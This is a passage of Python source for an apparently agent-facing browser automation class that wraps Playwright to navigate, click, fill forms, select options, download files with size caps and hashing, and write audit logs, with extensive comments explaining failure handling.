            snapshot_text, refs = self.a11y_snapshot()
            snapshot_audit["snapshot_node_count"] = len(refs)
            snapshot_audit["snapshot_char_count"] = len(snapshot_text)
        except Exception as exc:
            snapshot_audit["snapshot_error"] = type(exc).__name__
        self._audit_action("navigate", url, "ok", **snapshot_audit)
        if status is not None and status >= 400:
            snapshot_text = f"{HTTP_ERROR_PREFIX}{status}\n\n{snapshot_text}"
        try:
            self._persist_session_cookies()
        except Exception as exc:
            log.debug("post-navigate cookie writeback failed: %s", exc)
        return snapshot_text

    def goto(self, url: str) -> str:
        """ADR-028 back-compat alias for `navigate()`. Single-shot
        consumers (_browse_with_camoufox / _auth_browse_html) call
        goto() and discard the return; proper wrapper (not class-level
        assignment) so subclass overrides of navigate() are honored."""
        return self.navigate(url)

    def fetch_html(self, url: str) -> str:
        """Navigate and return raw HTML, skipping the accessibility
        snapshot that `navigate()` builds inline.

        The snapshot exists for interactive callers that need `@eN` refs
        next; the browse_page fallback reads the DOM and throws the refs
        away, and the summarizer behind it is the single most expensive
        step in the call (it has its own 25 s budget)."""
        self._require_open()
        self._check_domain(url)
        self._page.goto(url, wait_until="domcontentloaded", timeout=60000)
        self._wait_for_content_stable()
        html = self._page.content()
        self._audit_action("fetch_html", url, "ok", html_size=len(html))
        return html

    def get_page_html(self) -> str:
        """Return raw HTML of the current page. Used by T9 challenge
        detection before trafilatura conversion."""
        self._require_open()
        return self._page.content()

    def get_page_content(self) -> str:
        """Return current page as markdown via trafilatura."""
        return _html_to_markdown(self.get_page_html())

    # ─────────────────────────────────────────────────────────
    # ADR-029 Task 002 interactive methods (Playwright wrappers)
    # ─────────────────────────────────────────────────────────

    def scroll(self, direction: str = "down", amount: int = 500) -> None:
        """Scroll vertically by `amount` pixels. Finds the nearest
        scrollable container under the viewport center (modal/popup
        aware), moves the cursor to its center, dispatches a real
        mouse wheel (so listeners on `wheel` / IntersectionObserver
        infinite-scroll triggers fire just like a human action), then
        also calls scrollBy as a guaranteed-position fallback. Falls
        back to the document scrolling element when nothing scrollable
        is hit."""
        self._require_open()
        url = self._page.url
        delta = -amount if direction == "up" else amount
        try:
            result = self._page.evaluate(_SCROLL_VIEWPORT_JS, delta)
        except Exception as exc:
            self._audit_action(
                "scroll", url, "failed",
                direction=direction, amount=amount,
                **_audit_error(exc),
            )
            raise
        scrolled = (result or {}).get("scrolled", 0)
        target = (result or {}).get("target", "")
        center_x = (result or {}).get("centerX")
        center_y = (result or {}).get("centerY")
        wheel_ok = False
        if center_x is not None and center_y is not None:
            try:
                self._page.mouse.move(center_x, center_y)
                self._page.mouse.wheel(0, delta)
                wheel_ok = True
            except Exception as exc:
                log.debug("mouse wheel dispatch failed: %s", exc)
        self._audit_action(
            "scroll", url, "ok",
            direction=direction, amount=amount,
            scrolled=scrolled, target=target, wheel_ok=wheel_ok,
        )

    def click(
        self,
        ref_or_selector: str,
        timeout: int = 30000,
        probe_on_timeout: bool = True,
    ) -> dict:
        """Click an element. Accepts a `@eN` ref from the last
        `a11y_snapshot()` or a CSS selector (fallback).

        A click can end at Playwright's "performing click action" with
        nothing behind it — no request, no error, no line anywhere. The
        measured cause is a window Windows has stopped painting: see
        `_RAF_SAMPLE_MS`. So the frame rate is read before the attempt and
        logged with the element, and a starved window takes
        `dispatch_event` — the actionability wait it would otherwise sit in
        is driven by the frames that are not arriving. `probe_on_timeout` is
        for `download()`, which runs the same probes itself inside a
        download context; the diagnosis rides on the exception either way.

        Returns how the click was delivered, for the answer to say.
        """
        self._require_open()
        url = self._page.url
        mode = "ref" if ref_or_selector.startswith("@e") else "css"
        locator = None
        facts: dict = {}
        starved = False
        try:
            locator = self._resolve_ref(ref_or_selector)
            facts = self._click_target_facts(locator)
            starved = _window_is_starved(facts)
            log.info(
                "about to click %s (agent=%s, tag=%s, readyState=%s, "
                "raf=%s in %dms, url=%s)",
                ref_or_selector, self._agent_id,
                facts.get("tag") or "unknown", facts.get("ready") or "unknown",
                facts.get("raf"), _RAF_SAMPLE_MS, url,
            )
            if starved:
                log.warning(
                    "window is not being painted (minimised or off-screen); "
                    "dispatching the click without the actionability wait "
                    "(agent=%s, selector=%s, raf=%s in %dms)",
                    self._agent_id, ref_or_selector, facts.get("raf"),
                    _RAF_SAMPLE_MS,
                )
                locator.dispatch_event("click", timeout=timeout)
                delivery = _CLICK_DELIVERY_EVENT
            else:
                locator.click(timeout=timeout)
                delivery = _CLICK_DELIVERY_MOUSE
        except Exception as exc:
            probes = None
            if locator is not None and probe_on_timeout and _is_timeout(exc):
                probes, _file, _by = self._click_probes(locator)
            if locator is not None:
                setattr(exc, _CLICK_DIAGNOSIS_ATTR, {
                    "probes": probes, "raf": facts.get("raf"), "starved": starved,
                })
            self._audit_action(
                "click", url, "failed",
                selector=ref_or_selector, mode=mode, probes=probes,
                raf=facts.get("raf"), **_audit_error(exc),
            )
            raise
        self._audit_action(
            "click", url, "ok", selector=ref_or_selector, mode=mode,
            delivery=delivery, raf=facts.get("raf"),
        )
        return {"delivery": delivery, "raf": facts.get("raf"), "starved": starved}

    def _click_target_facts(self, locator) -> dict:
        """The element, the document and the frame rate, in one bounded call.

        A page that cannot answer costs the reading, not the click — and an
        absent reading leaves the ordinary click in place."""
        try:
            return locator.evaluate(
                _CLICK_FACTS_JS, _RAF_SAMPLE_MS, timeout=_CLICK_PROBE_TIMEOUT_MS,
            ) or {}
        except Exception as exc:
            log.debug("click target facts unavailable: %s", exc)
            return {}

    def _click_probes(self, locator, catch_download: bool = False):
        """What a click that timed out anyway is asked afterwards, and the
        file the last of them may start.

        Is the main thread answering; is the window being painted; and does
        a click dispatched from JS get through. Each is caught on its own,
        so the first failure still leaves the other answers.

        `wait_for_function` rather than `evaluate` for the first, because
        `page.evaluate` takes no timeout and an unbounded probe on a wedged
        page is the thing being diagnosed. `catch_download` wraps the one
        that acts in a download context: a rescue that works is how the file
        arrives, and a download nobody waits for dies with the context.

        Returns (lines, download or None, name of the probe that started it).
        """
        lines: List[str] = []
        download = None
        started_by = ""
        try:
            self._page.wait_for_function("1+1", timeout=_CLICK_PROBE_TIMEOUT_MS)
            lines.append("evaluate: passed")
        except Exception as exc:
            lines.append(f"evaluate: failed({type(exc).__name__})")

        facts = self._click_target_facts(locator)
        if facts.get("raf") is None:
            lines.append("raf: failed(no answer)")
        else:
            lines.append(
                f"raf: {facts['raf']} in {_RAF_SAMPLE_MS}ms"
                + (" (starved — the window is not being painted)"
                   if _window_is_starved(facts) else "")
            )

        outcome = None
        try:
            if catch_download:
                with self._page.expect_download(
                    timeout=_CLICK_PROBE_DOWNLOAD_MS
                ) as pending:
                    outcome = locator.evaluate(
                        _JS_CLICK, timeout=_CLICK_PROBE_TIMEOUT_MS
                    )
                download = pending.value
                started_by = "js_click"
            else:
                outcome = locator.evaluate(
                    _JS_CLICK, timeout=_CLICK_PROBE_TIMEOUT_MS
                )
        except Exception as exc:
            if outcome is None:
                lines.append(f"js_click: failed({type(exc).__name__})")
                return lines, download, started_by
            # The rescue itself ran; what ran out was the wait for a file.
        lines.append(
            "js_click: passed and started the download" if download is not None
            else "js_click: passed"
        )
        return lines, download, started_by

    def _cross_host_links(self) -> Optional[List[dict]]:
        """The current page's links to a host other than its own, bounded.

        Named, never followed: clicking stays the only way this tool obtains a
        file, so the agent's next move is a fresh snapshot and
        `browser_download` on that link's ref. None means the page could not
        be asked — a page that navigated away or died says nothing here rather
        than turning a no-download answer into an exception.
        """
        try:
            raw = self._page.evaluate(
                _CROSS_HOST_LINKS_JS, _NO_DOWNLOAD_LINKS_MAX
            )
        except Exception as exc:
            log.debug("cross-host link scan failed: %s", exc)
            return None
        named = [i for i in (raw or []) if (i or {}).get("href") and i.get("text")]
        nameless = [
            i for i in (raw or []) if (i or {}).get("href") and not i.get("text")
        ]
        links: List[dict] = []
        for item in (named + nameless)[:_NO_DOWNLOAD_LINKS_MAX]:
            href = _one_line(str(item.get("href") or ""))
            if not href:
                continue
            links.append({
                "href": href,
                "text": _one_line(
                    str(item.get("text") or ""), _NO_DOWNLOAD_LINK_TEXT_LIMIT
                ),
            })
        return links

    def download(
        self,
        ref_or_selector: str,
        directory: str,
        timeout: int = _DOWNLOAD_TIMEOUT_DEFAULT * 1000,
        max_bytes: Optional[int] = None,
    ) -> dict:
        """Click `ref_or_selector` and save what it downloads into
        `directory`, an absolute path the caller has already resolved and had
        the firewall accept — the sandbox, or a granted extended path.

        Returns a status dict — `ok`, `no_download`, `too_large`, `failed` —
        the way `collect` does; the tool writes the sentence. The click is
        `self.click`, so actionability, ref staleness and the audit row are
        `browser_click`'s and not a second copy of them. The saved file is
        hashed and its first bytes are read; nothing parses or runs it.
        """
        self._require_open()
        target_dir = Path(directory)
        # Read now, not as a default: the cap is a module-level setting and a
        # value frozen at definition would ignore every later change to it.
        cap = DOWNLOAD_MAX_BYTES if max_bytes is None else max_bytes
        url = self._page.url
        try:
            title = self._page.title()
        except Exception:
            title = ""
        probes: Optional[List[str]] = None
        started_by = ""
        starved = False
        self._download_claimed = True
        try:
            try:
                with self._page.expect_download(timeout=timeout) as pending:
                    starved = bool(self.click(
                        ref_or_selector, timeout=timeout, probe_on_timeout=False,
                    ).get("starved"))
                download = pending.value
            except ValueError:
                raise  # a ref the snapshot no longer answers
            except Exception as exc:
                if _is_session_dead(exc):
                    raise
                download = None
                diagnosis = getattr(exc, _CLICK_DIAGNOSIS_ATTR, None) or {}
                starved = bool(diagnosis.get("starved"))
                # Only when the CLICK is what timed out: a click that landed
                # and started nothing must not be repeated by a probe, because
                # a site that meters downloads charges for the second press.
                if hasattr(exc, _CLICK_DIAGNOSIS_ATTR) and _is_timeout(exc):
                    try:
                        probes, download, started_by = self._click_probes(
                            self._resolve_ref(ref_or_selector),
                            catch_download=True,
                        )
                    except Exception as probe_exc:
                        log.debug("click probes unavailable: %s", probe_exc)
                if download is None:
                    # An ordinary link, an element that never moved, and a
                    # network that was down for the minute all arrive here as
                    # one timeout, so nothing here says which: what goes back
                    # is where the page was, where it is, and how many tabs
                    # there are — a site that opens the file in a new tab is
                    # the other reading of a silent click.
                    now = self._page.url
                    try:
                        tab_count = len(self._context.pages)
                    except Exception:
                        tab_count = 0
                    links = self._cross_host_links()
                    self._audit_action(
                        "download", url, "failed",
                        selector=ref_or_selector, reason="no_download",
                        timeout=timeout, page_url=now, url_before=url,
                        tab_count=tab_count, error=type(exc).__name__,
                        probes=probes,
                        # The count, not the hrefs: the row is a ledger of
                        # what the tool did, and the links themselves are in
                        # the answer.
                        cross_host_links=None if links is None else len(links),
                    )
                    return {
                        "status": "no_download", "page_url": now,
                        "url_before": url, "tab_count": tab_count,
                        "cross_host_links": links, "probes": probes,
                        "window_not_painted": starved,
                        "timeout_ms": timeout, "error": type(exc).__name__,
                    }
            return self._save_download(
                download, ref_or_selector, target_dir, cap, url, title,
                probes, started_by, starved,
            )
        finally:
            self._download_claimed = False

    def _save_download(
        self, download, ref_or_selector: str, target_dir: Path, cap: int,
        url: str, title: str, probes: Optional[List[str]] = None,
        started_by: str = "", starved: bool = False,
    ) -> dict:
        """Copy the bytes out of Playwright's temp folder and say what they
        are. Split from `download()` so the file a probe started is saved by
        the same path as the one the click started."""
        suggested = download.suggested_filename or ""
        try:
            source_url = download.url or ""
        except Exception:
            source_url = ""
        failure = download.failure()
        if failure:
            self._audit_action(
                "download", source_url or url, "failed",
                selector=ref_or_selector, reason=_one_line(failure),
            )
            return {
                "status": "failed", "reason": failure,
                "suggested": suggested, "source_url": source_url,
            }

        target_dir.mkdir(parents=True, exist_ok=True)
        temp_path = target_dir / f".dpc-download-{uuid.uuid4().hex}.part"
        final_path: Optional[Path] = None
        try:
            download.save_as(str(temp_path))
            size = temp_path.stat().st_size
            if size > cap:
                temp_path.unlink(missing_ok=True)
                self._audit_action(
                    "download", source_url or url, "denied",
                    selector=ref_or_selector, byte_size=size, max_bytes=cap,
                )
                return {
                    "status": "too_large", "size": size,
                    "max_bytes": cap, "suggested": suggested,
                    "source_url": source_url,
                }
            final_path = _unique_download_path(
                target_dir, _safe_download_name(suggested)
            )
            os.replace(temp_path, final_path)
        except Exception:
            # No partial file left behind, under either name.
            temp_path.unlink(missing_ok=True)
            if final_path is not None:
                final_path.unlink(missing_ok=True)
            raise

        digest = _file_sha256(final_path)
        with open(final_path, "rb") as fh:
            detected = _sniff_file_type(fh.read(_DOWNLOAD_SNIFF_BYTES))
        log.info(
            "browser_download saved %s (%d bytes, sha256=%s, type=%s) agent=%s",
            final_path, size, digest, detected, self._agent_id,
        )
        self._audit_action(
            "download", source_url or url, "ok",
            selector=ref_or_selector, saved=str(final_path),
            byte_size=size, sha256=digest, detected_type=detected,
        )
        return {
            "status": "ok",
            "path": str(final_path),
            "size": size,
            "sha256": digest,
            "detected_type": detected,
            "type_mismatch": _type_contradicts_extension(
                detected, final_path.name
            ),
            "suggested": suggested,
            "source_url": source_url,
            "page_url": url,
            "page_title": title,
            "probes": probes,
            "started_by": started_by,
            "window_not_painted": starved,
        }

    def _watch_for_unclaimed_downloads(self, page) -> None:
        """Keep the files this session starts without being asked.

        Playwright puts every download in a temp folder under a GUID and
        deletes it at context close, so a file started by a hand click in the
        visible window, or by a page that redirects between two tool calls,
        left nothing behind and said nothing. Idempotent: the context's own
        `page` event also fires for the page `_open` creates."""
        if page is None or id(page) in self._download_watched_pages:
            return
        try:
            page.on("download", self._keep_unclaimed_download)
        except Exception as exc:
            log.debug("attach download capture failed: %s", exc)
            return
        self._download_watched_pages.add(id(page))

    def _keep_unclaimed_download(self, download) -> None:
        """Save a download no tool call is waiting for, and record it the way
        `browser_download` records its own."""
        if self._download_claimed:
            return
        try:
            suggested = download.suggested_filename or ""
            source_url = download.url or ""
            directory = _unclaimed_download_dir(self._agent_id)
            directory.mkdir(parents=True, exist_ok=True)
            path = _unique_download_path(directory, _safe_download_name(suggested))
            download.save_as(str(path))
            size = path.stat().st_size
            with open(path, "rb") as fh:
                detected = _sniff_file_type(fh.read(_DOWNLOAD_SNIFF_BYTES))
            page_url, page_title = "", ""
            try:
                page = download.page
                page_url, page_title = page.url, page.title()
            except Exception:
                pass
            self._unclaimed_downloads += 1
            log.info(
                "kept an unclaimed download: %s (%d bytes, type=%s) from %s "
                "(agent=%s)",
                path, size, detected, source_url, self._agent_id,
            )
            _append_download_record(directory, {
                "saved_at": datetime.now(timezone.utc).isoformat(),
                "saved_path": path.name,
                "bytes": size,
                "sha256": _file_sha256(path),
                "detected_type": detected,
                "suggested_filename": suggested,
                "url": source_url,
                "page_url": page_url,
                "page_title": _one_line(page_title),
                "note": _UNCLAIMED_NOTE,
            })
        except Exception as exc:
            log.warning(
                "an unclaimed download could not be kept (agent=%s): %s: %s",
                self._agent_id, type(exc).__name__, exc,
            )

    def fill(self, ref_or_selector: str, text: str) -> None:
        """Fill an input element. Accepts a `@eN` ref or CSS selector.
        Audit logs text_length, not the value."""
        self._require_open()
        url = self._page.url
        text_length = len(text)
        mode = "ref" if ref_or_selector.startswith("@e") else "css"
        try:
            self._resolve_ref(ref_or_selector).fill(text)
        except Exception as exc:
            self._audit_action(
                "fill", url, "failed",
                selector=ref_or_selector, mode=mode,
                text_length=text_length, **_audit_error(exc),
            )
            raise
        self._audit_action(
            "fill", url, "ok",
            selector=ref_or_selector, mode=mode, text_length=text_length,
        )

    def select(
        self,
        ref_or_selector: str,
        by: str,
        named: Any,
        timeout: int = _SELECT_TIMEOUT_MS,
    ) -> dict:
        """Choose one option of a native `<select>`, named by `by` — one of
        `value`, `label`, `index` — and `named`.

        Returns a status dict — `ok`, `not_a_select`, `select_disabled`,
        `multiple`, `no_such_option`, `option_disabled`, `failed` — the way
        `download` does; the tool writes the sentence. The choosing is
        Playwright's `select_option`, so the page's own `input` and `change`
        handlers fire and the wait for actionability is the one `click` and
        `fill` get; ref staleness is `_resolve_ref`'s.

        For a select the snapshot withholds, the value is still set — the
        agent may have been given a card expiry to fill — but no option's
        label, value or count of siblings comes back through here.
        """
        self._require_open()
        url = self._page.url
        mode = "ref" if ref_or_selector.startswith("@e") else "css"
        locator = self._resolve_ref(ref_or_selector)
        probe = locator.evaluate(_SELECT_PROBE_JS) or {}
        row = {"selector": ref_or_selector, "mode": mode, "by": by}
        tag = str(probe.get("tag") or "")
        if tag != "select":
            self._audit_action(
                "select", url, "failed",
                reason="not_a_select", tag=tag, **row,
            )
            return {
                "status": "not_a_select", "tag": tag,
                "input_type": str(probe.get("type") or ""),
            }
        secret = bool(probe.get("secret"))
        row["secret"] = secret
        option_count = int(probe.get("optionCount") or 0)
        if probe.get("disabled"):
            self._audit_action(
                "select", url, "failed", reason="select_disabled", **row,
            )
            return {"status": "select_disabled"}
        if probe.get("multiple"):
            self._audit_action(
                "select", url, "failed", reason="multiple", **row,
            )
            return {"status": "multiple"}
        # Empty for a withheld select: the page was never asked for them.
        options = list(probe.get("options") or [])
        chosen = None
        if not secret:
            chosen = _match_select_option(options, by, named)
            if chosen is None:
                self._audit_action(
                    "select", url, "failed",
                    reason="no_such_option", option_count=option_count, **row,
                )
                return {
                    "status": "no_such_option", "secret": False, "by": by,
                    "named": named, "options": options,
                    "option_count": option_count,
                }
            if chosen.get("disabled"):
                self._audit_action(
                    "select", url, "failed", reason="option_disabled", **row,
                )
                return {
                    "status": "option_disabled", "secret": False,
                    "value": chosen.get("value", ""),
                    "label": chosen.get("label", ""),
                }
        try:
            if by == "value":
                locator.select_option(value=str(named), timeout=timeout)
            elif by == "label":
                locator.select_option(label=str(named), timeout=timeout)
            else:
                locator.select_option(index=int(named), timeout=timeout)
        except Exception as exc:
            if _is_session_dead(exc):
                raise
            self._audit_action(
                "select", url, "failed", **row, **_audit_error(exc),
            )
            if secret:
                # Nothing was pre-checked here, so Playwright's own failure is
                # all there is to go on — and it says no more than that.
                return {
                    "status": "no_such_option", "secret": True, "by": by,
                    "options": [], "option_count": option_count,
                }
            return {"status": "failed", "reason": str(exc)}

        # Read before the URL is waited on: a change handler that navigates
        # takes the element with it, and then what the probe matched is the
        # last true statement about what was chosen.
        after: dict = {}
        try:
            after = locator.evaluate(_SELECT_CHOSEN_JS) or {}
        except Exception:
            after = {}
        if not secret and not after:
            after = {
                "value": (chosen or {}).get("value", ""),
                "label": (chosen or {}).get("label", ""),
            }
        navigated = self._page.url != url
        if not navigated:
            try:
                self._page.wait_for_url(
                    lambda current: current != url,
                    timeout=_SELECT_URL_SETTLE_MS,
                )
                navigated = True
            except Exception:
                navigated = False
        try:
            url_after = self._page.url
        except Exception:
            url_after = url
        if not secret:
            row["chose"] = _one_line(
                str(after.get("value") or ""), _SELECT_OPTION_LIMIT,
            )
        self._audit_action(
            "select", url, "ok",
            navigated=navigated, page_url=url_after, **row,
        )
        return {
            "status": "ok", "secret": secret,
            "value": "" if secret else str(after.get("value") or ""),
            "label": "" if secret else str(after.get("label") or ""),
            "url_before": url, "url_after": url_after, "navigated": navigated,
        }

    def screenshot(
        self, full_page: bool = False, save_to: str | None = None
    ) -> bytes | str:
        """Capture a screenshot of the current page.

        Returns PNG bytes by default. When `save_to` is given, writes
        the image to that path and returns the path string instead —
        escape hatch for large full-page screenshots that cause memory
        pressure in the agent loop. Caller owns cleanup of the saved
        file; AuthBrowser does not track or auto-remove it on close.

        Audit logs byte_size, not the image data."""
        self._require_open()
        try:
            url = self._page.url
        except AttributeError:
            url = ""
        try:
            if save_to:
                self._page.screenshot(full_page=full_page, path=save_to)
                byte_size = (
                    os.path.getsize(save_to) if os.path.exists(save_to) else 0
                )
                self._audit_action(
                    "screenshot", url, "ok",
                    full_page=full_page, byte_size=byte_size,
                    saved=save_to,
                )
                return save_to
            png = self._page.screenshot(full_page=full_page)
            self._audit_action(
                "screenshot", url, "ok",
                full_page=full_page, byte_size=len(png),
            )
            return png
        except Exception as exc:
            self._audit_action(
                "screenshot", url, "failed",
                full_page=full_page, **_audit_error(exc),
            )
            raise

    def wait_for(self, ref_or_selector: str, timeout: int = 30000) -> None:
        """Wait for an element to become visible. Accepts a `@eN` ref
        or CSS selector."""
        self._require_open()
        url = self._page.url
        mode = "ref" if ref_or_selector.startswith("@e") else "css"
        try:
            self._resolve_ref(ref_or_selector).wait_for(
                timeout=timeout, state="visible",
            )
        except Exception as exc:
            error_name = type(exc).__name__
            self._audit_action(
                "wait_for", url, "failed",
                selector=ref_or_selector, mode=mode, timeout=timeout,
                timeout_hit="timeout" in error_name.lower(),
                error=error_name,
            )
            raise
        self._audit_action(
            "wait_for", url, "ok",
            selector=ref_or_selector, mode=mode, timeout=timeout,
        )

    def extract(self) -> str:
        """Return full HTML — audit-wrapped wrapper around get_page_html."""
        self._require_open()
        url = self._page.url
        try:
            html = self.get_page_html()
        except Exception as exc:
            self._audit_action(
                "extract", url, "failed", **_audit_error(exc),
            )
            raise
        self._audit_action("extract", url, "ok", html_size=len(html))
        return html

    def switch_tab(self, index: int):
        """Switch the active page to the tab at `index` in the current
        context. The new tab persists across subsequent calls (spec
        Q2 default = persist, matches user mental model)."""
        self._require_open()
        pages = self._context.pages
        from_index = pages.index(self._page) if self._page in pages else -1
        from_url = self._page.url
        try:
            if index < 0 or index >= len(pages):
                raise IndexError(
                    f"switch_tab: index {index} out of range "
                    f"(context has {len(pages)} page(s))"
                )
            self._page = pages[index]
        except Exception as exc:
            self._audit_action(
                "switch_tab", from_url, "failed",
                from_index=from_index, to_index=index,
                **_audit_error(exc),
            )
            raise
        self._audit_action(
            "switch_tab", self._page.url, "ok",
            from_index=from_index, to_index=index,
            url_at_target=self._page.url,
        )
        return self._page

    def wait_for_popup(self, timeout: int = 30000):
        """Wait for a site-opened popup (window.open / target=_blank)
        and return the new Page. Use `switch_tab` afterwards to make
        the popup the active page."""
        self._require_open()
        return self._page.wait_for_event("popup", timeout=timeout)

    def a11y_snapshot(self) -> tuple[str, dict]:
        """Build an accessibility-tree snapshot of the current page.

        Returns (tree_text, refs) where tree_text is an indented textual
        representation tagged with `@eN` ids on interactive nodes, and
        refs maps each `@eN` to a {role, name} dict. The result is
        cached on `self._last_refs` so subsequent `click`/`fill`/
        `wait_for` calls can resolve refs against the same snapshot.
        Refs are NOT stable across snapshots — a fresh call rebuilds
        the map from scratch."""
        self._require_open()
        url = self._page.url
        try:
            self._snapshot_serial += 1
            raw = self._page.evaluate(
                _A11Y_DOM_SNAPSHOT_JS, self._snapshot_serial,
            )
            tree_text, refs = _build_a11y_tree(raw) if raw else ("", {})
            self._last_refs = refs
        except Exception as exc:
            self._audit_action(
                "snapshot", url, "failed", **_audit_error(exc),
            )
            raise
        self._audit_action(
            "snapshot", url, "ok",
            node_count=len(refs), char_count=len(tree_text),
        )
        return tree_text, refs

    def detect_scrollable_containers(self) -> list[dict]:
        """Detect scrollable containers on the page and return CSS hints."""
        self._require_open()
        try:
            return self._page.evaluate(_DETECT_SCROLLABLE_CONTAINERS_JS) or []
        except Exception:
            return []

    def collect(
        self,
        container: str,
        item_selector: str,
        extract: list[str],
        max_scrolls: int = 30,
        scroll_pause_ms: int = 5000,
        dedup_by: str = "text",
    ) -> dict:
        """Scroll a container and collect all matching items.

        Scrolls the container, extracts items matching item_selector,
        deduplicates by dedup_by key, repeats until no new items appear
        or max_scrolls is reached. Returns {items: [...], total, scrolls_done}.
        """
        self._require_open()
        import time as _time

        _COLLECT_ITEMS_JS = """
        ({containerSel, itemSelector, extractAttrs}) => {
          const ct = document.querySelector(containerSel);
          if (!ct) return {error: 'container not found: ' + containerSel};
          const els = document.querySelectorAll(itemSelector);
          const items = [];
          for (const el of els) {
            if (!ct.contains(el) && !el.contains(ct)) {
              const closestScroller = el.closest(containerSel);
              if (!closestScroller) continue;
            }
            const item = {};
            for (const attr of extractAttrs) {
              if (attr === 'text') {
                item.text = el.textContent.trim().replace(/\\s+/g, ' ');
              } else if (attr === 'href') {
                const a = el.tagName === 'A' ? el : el.querySelector('a');
                item.href = a ? a.href : '';
              } else if (attr === 'html') {
                item.html = el.innerHTML;
              } else {
                item[attr] = el.getAttribute(attr) || '';
              }
            }
            items.push(item);
          }
          return {items, found: els.length, matched: items.length};
        }
        """

        all_items: list[dict] = []
        seen_keys: set[str] = set()
        dupes_skipped = 0
        scrolls_done = 0
        consecutive_empty = 0
        max_consecutive_empty = 10
        url = self._page.url

        # Three ways out of this loop and they mean opposite things: the list
        # ended, the scroll budget ran out, or scrolling threw. Reporting only
        # the item count made "collected everything" and "stopped early"
        # print identically, and an agent could not tell which it had.
        stop_reason = "scroll_budget_exhausted"
        for _pass in range(max_scrolls + 1):
            result = self._page.evaluate(_COLLECT_ITEMS_JS, {
                "containerSel": container,
                "itemSelector": item_selector,
                "extractAttrs": extract or ["text"],
            })
            if isinstance(result, dict) and "error" in result:
                self._audit_action("collect", url, "failed", error=result["error"])
                return {"error": result["error"], "items": [], "total": 0, "scrolls_done": scrolls_done}

            new_count = 0
            for item in (result or {}).get("items", []):
                key = item.get(dedup_by, str(item))
                if key and key not in seen_keys:
                    seen_keys.add(key)
                    all_items.append(item)
                    new_count += 1
                else:
                    dupes_skipped += 1

            if new_count > 0:
                consecutive_empty = 0
            elif scrolls_done > 0:
                consecutive_empty += 1
                if consecutive_empty >= max_consecutive_empty:
                    stop_reason = "list_exhausted"
                    break

            # The last pass collects and stops: scrolling once more would move
            # the page with nothing left to read it. Without this the loop
            # scrolled `max_scrolls + 1` times and reported one more scroll
            # than the caller asked for — Ark, 2026-08-23, live on Hacker News:
            # «6 scrolls» against `max_scrolls=5`.
            if _pass == max_scrolls:
                break

            try:
                self.scroll("down", 800)
            except Exception as e:
                stop_reason = f"scroll_failed: {type(e).__name__}"
                break

            scrolls_done += 1
            _time.sleep(scroll_pause_ms / 1000.0)

        self._audit_action(
            "collect", url, "ok",
            container=container, item_selector=item_selector,
            total=len(all_items), scrolls=scrolls_done,
        )
        result_dict: dict = {
            "items": all_items,
            "total": len(all_items),
            "scrolls_done": scrolls_done,
            "max_scrolls": max_scrolls,
            "stop_reason": stop_reason,
            # How many scrolls in a row added nothing when the loop ended.
            # «The budget ran out» and «the budget ran out while the last four
            # scrolls added nothing» are different claims: the first invites
            # raising max_scrolls, the second says the page may simply have no
            # more to give. Ark, 2026-08-23, on Hacker News: 30 fixed items,
            # 150 duplicates, and advice to raise a budget that would change
            # nothing.
            "consecutive_empty": consecutive_empty,
        }
        if dupes_skipped > 0:
            result_dict["warning"] = f"{dupes_skipped} duplicates skipped, consider specifying unique attribute for dedup_by"
        return result_dict

    def _resolve_ref(self, ref_or_selector: str):
        """Map a `@eN` ref against the last snapshot to a Playwright
        locator; fall back to treating the string as a CSS selector.

        The ref addresses the exact element the snapshot walked, via the
        `data-dpc-el` mark stamped during that walk. Addressing it by
        (role, name) instead — what this did before — fails on real
        pages in two ways, both seen in one session against YouTube
        Studio and TikTok:

        * an element with no accessible name (every icon button) produced
          `get_by_role("button")`, which matched all 24 buttons on the
          page and died instantly on strict mode;
        * a name that does exist is rarely unique, and the ordinal used to
          disambiguate it assumed the page had not re-rendered between
          the snapshot and the click — on a Polymer app it usually has.

        Raises ValueError for a ref missing from `_last_refs`, and for one
        whose element is no longer in the page, so the caller can tell the
        agent to take a fresh snapshot instead of waiting out a timeout on
        a locator that can never match."""
        self._require_open()
        if ref_or_selector.startswith("@e"):
            node = self._last_refs.get(ref_or_selector)
            if node is None:
                raise ValueError(
                    f"unknown ref {ref_or_selector!r} — "
                    "call a11y_snapshot() to refresh"
                )
            el_id = node.get("el", "")
            if not el_id:
                raise ValueError(
                    f"ref {ref_or_selector!r} carries no element mark — "
                    "call a11y_snapshot() to refresh"
                )
            locator = self._page.locator(f'[data-dpc-el="{el_id}"]')
            # count() answers now; letting a vanished element go to click()
            # costs the full timeout and then reports it as if the element
            # were merely slow. A count() that itself fails decides nothing —
            # fall through and let the action speak.
            try:
                present = locator.count()
            except Exception:
                present = -1
            if present == 0:
                raise ValueError(
                    f"ref {ref_or_selector!r} is stale — the page changed "
                    "since the snapshot; call a11y_snapshot() to refresh"
                )
            return locator
        return self._page.locator(ref_or_selector)

    def close(self) -> None:
        """Release browser resources. Safe to call multiple times.

        Idempotent + race-tolerant: the live-only work (audit + cookie
        writeback) is guarded by `_disconnected` so a disconnect event
        firing mid-close skips the doomed IPC (the failure mode behind the
        S155 Ctrl+C hang). The Camoufox `__exit__` (driver-subprocess
        teardown) runs unconditionally in the finally block — even after a
        disconnect — so the subprocess and its OS pipe are always released;
        skipping it orphaned the pipe and left a Windows IOCP overlapped
        read pending → ProactorEventLoop spin at shutdown. This call can
        itself hang forever — Playwright's `__exit__` parks in its dispatcher
        fiber and does not return even after the subprocess is killed
        (observed 2026-08-12 17:32) — which is why the thread it runs on is a
        daemon `_PinnedThread` rather than a pool worker the interpreter
        joins. Registry / lock / thread teardown always runs too."""
        # Outside the `_disconnected` guard: the coalesced gate counts are
        # file writes that owe nothing to a live browser, and a window the
        # person closed is exactly when they must still land.
        try:
            self._flush_gate_audit()
        except Exception as exc:
            log.warning("gate audit flush failed for agent=%s: %s", self._agent_id, exc)
        try:
            if not self._disconnected:
                url = ""
                if self._page is not None:
                    try:
                        url = self._page.url
                    except Exception:
                        pass
                self._audit_action(
                    "close", url, "ok",
                    unclaimed_downloads=self._unclaimed_downloads,
                )
                if self._unclaimed_downloads:
                    log.info(
                        "session kept %d unclaimed download(s) in %s (agent=%s)",
                        self._unclaimed_downloads,
                        _unclaimed_download_dir(self._agent_id),
                        self._agent_id,
                    )
                if self._context is not None:
                    try:
                        self._persist_session_cookies()
                    except Exception as exc:
                        log.warning(
                            "cookie writeback during close failed for agent=%s: %s",
                            self._agent_id, exc,
                        )
        finally:
            # Tear down the Camoufox context manager regardless of
            # `_disconnected` — this is what kills the driver subprocess and
            # drains its pipe. Best-effort: log at DEBUG since a disconnected
